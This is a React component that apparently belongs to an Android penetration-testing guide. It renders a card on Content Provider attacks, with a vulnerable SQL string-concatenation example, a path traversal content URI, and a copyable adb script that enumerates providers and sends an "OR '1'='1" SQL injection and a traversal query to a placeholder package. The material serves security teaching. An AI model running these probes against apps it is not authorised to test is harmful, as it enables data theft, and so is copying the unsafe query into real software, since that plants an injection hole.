
import React from 'react';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Copy, Database } from 'lucide-react';

const ContentProviderSection: React.FC = () => {
  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
  };

  return (
    <Card>
      <CardHeader>
        <CardTitle className="flex items-center gap-2">
          <Database className="h-5 w-5" />
          Content Provider Security Analysis
        </CardTitle>
        <CardDescription>
          Testing Content Providers for SQL injection, path traversal, and access control issues
        </CardDescription>
      </CardHeader>
      <CardContent className="space-y-6">
        <div className="space-y-4">
          <h3 className="text-lg font-semibold">Content Provider Attack Vectors</h3>
          
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="border rounded-lg p-4">
              <h4 className="font-semibold text-red-600 mb-2">SQL Injection</h4>
              <p className="text-sm text-gray-600 mb-3">
                Exploiting unsafe SQL query construction
              </p>
              <div className="bg-gray-50 p-3 rounded-md">
                <code className="text-xs">
                  {`// Vulnerable query construction
String query = "SELECT * FROM users WHERE id = " + id;
// Should use parameterized queries instead`}
                </code>
              </div>
            </div>

            <div className="border rounded-lg p-4">
              <h4 className="font-semibold text-orange-600 mb-2">Path Traversal</h4>
              <p className="text-sm text-gray-600 mb-3">
                Directory traversal through content URIs
              </p>
              <div className="bg-gray-50 p-3 rounded-md">
                <code className="text-xs">
                  {`content://com.app.provider/files/../../../data/sensitive.db`}
                </code>
              </div>
            </div>
          </div>

          <div className="space-y-4">
            <h4 className="font-semibold">Content Provider Testing Scripts</h4>
            
            <div className="bg-black text-green-400 p-4 rounded-lg">
              <div className="flex items-center justify-between mb-2">
                <span className="text-sm font-semibold">Content Provider Enumeration</span>
                <Button 
                  size="sm" 
                  variant="outline" 
                  onClick={() => copyToClipboard(`#!/bin/bash
# Content Provider enumeration and testing

PACKAGE_NAME="com.example.target"

echo "Enumerating Content Providers for $PACKAGE_NAME"

# Extract and analyze AndroidManifest.xml
aapt dump xmltree app.apk AndroidManifest.xml | grep -A 10 -B 2 "provider"

# Test common Content Provider URIs
COMMON_URIS=(
    "content://$PACKAGE_NAME.provider/"
    "content://$PACKAGE_NAME.provider/users"
    "content://$PACKAGE_NAME.provider/files"
    "content://$PACKAGE_NAME.provider/settings"
)

for uri in "\${COMMON_URIS[@]}"; do
    echo "Testing URI: $uri"
    adb shell content query --uri "$uri" 2>/dev/null || echo "URI not accessible"
done

# SQL Injection tests
echo "Testing SQL injection vulnerabilities..."
adb shell content query --uri "content://$PACKAGE_NAME.provider/users" \\
    --where "id=1' OR '1'='1"

# Path traversal tests
echo "Testing path traversal vulnerabilities..."
adb shell content query --uri "content://$PACKAGE_NAME.provider/files/../../../data"`)}
                >
                  <Copy className="h-3 w-3" />
                </Button>
              </div>
              <pre className="text-xs overflow-x-auto">
{`#!/bin/bash
# Content Provider enumeration and testing

PACKAGE_NAME="com.example.target"

echo "Enumerating Content Providers for $PACKAGE_NAME"

# Test common Content Provider URIs
COMMON_URIS=(
    "content://$PACKAGE_NAME.provider/"
    "content://$PACKAGE_NAME.provider/users"
    "content://$PACKAGE_NAME.provider/files"
)

for uri in "\${COMMON_URIS[@]}"; do
    echo "Testing URI: $uri"
    adb shell content query --uri "$uri"
done`}
              </pre>
            </div>
          </div>
        </div>
      </CardContent>
    </Card>
  );
};

export default ContentProviderSection;
